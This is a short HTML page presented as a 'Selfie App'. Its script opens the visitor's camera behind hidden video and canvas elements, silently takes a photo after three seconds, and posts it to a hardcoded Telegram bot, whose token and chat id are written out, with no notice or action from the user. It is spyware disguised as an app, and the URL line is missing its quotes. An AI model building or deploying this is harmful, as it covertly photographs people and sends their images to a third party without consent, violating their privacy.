<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Selfie to Telegram</title>
</head>
<body>
    <h1>Selfie App</h1>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // Access the camera
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Automatically take a selfie after the video stream is ready
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, 640, 480);
                        const dataURL = canvas.toDataURL('image/png');
                        sendToTelegram(dataURL);
                    }, 3000); // Delay to allow the camera to focus
                };
            })
            .catch(err => console.error("Error accessing camera: ", err));

        // Function to send the image to Telegram
        function sendToTelegram(imageData) {
            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk';
            const chatId = '6121166273';
            const url = https://api.telegram.org/bot${token}/sendPhoto;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', dataURItoBlob(imageData), 'selfie.png');

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch((error) => console.error('Error:', error));
        }

        // Helper function to convert base64 to Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], {type: mimeString});
        }
    </script>
</body>
</html>
